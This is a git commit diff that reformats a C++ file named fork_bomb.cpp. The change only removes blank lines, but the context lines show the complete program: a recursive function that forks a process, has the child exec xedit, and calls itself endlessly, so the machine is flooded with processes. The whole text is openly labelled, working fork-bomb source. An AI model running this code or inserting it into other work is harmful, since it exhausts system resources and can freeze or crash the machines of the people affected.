d2c3a199cf307f4eb3bf4fc26f9b130d09d504eb
c4llv07e <igor@c4llv07e.xyz>
2025-01-02 00:58:13 +0300

    Fix formating.

--- fork_bomb.cpp
+++ fork_bomb.cpp
@@ -3,16 +3,11 @@
 
 int bomb()
 {
-
   char* command = "xedit";
   char* argument_list[] = {"xedit", "", NULL};
 
-
   if (fork() == 0) {
-
       int status_code = execvp(command, argument_list);
-
-
       if (status_code == -1) {
           printf("Terminated Incorrectly\n");
           return 1;
@@ -20,12 +15,9 @@ int bomb()
   }
 
   return bomb();
-
 }
 
-
 int main() {
-
     bomb();
     return 0;
 
